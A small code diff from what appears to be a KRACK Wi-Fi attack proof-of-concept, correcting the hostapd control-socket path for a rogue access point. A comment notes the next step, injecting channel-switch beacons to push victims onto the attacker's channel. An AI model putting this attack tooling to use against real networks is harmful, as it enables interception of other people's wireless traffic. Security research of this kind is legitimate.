@@ -939,7 +939,7 @@ class KRAckAttack():
 		# when domain name (encode) to idna, label empty or too long error, 
 		# that is because domain name uses "." to split label,
 		# every label limited to longest 63 characters or no empty.
-		self.hostapd_ctrl = Ctrl("/root/krackattacks-poc-zerokey/krackattack/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
+		self.hostapd_ctrl = Ctrl("/root/krackattacks-poc-zerokey/krackattack/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
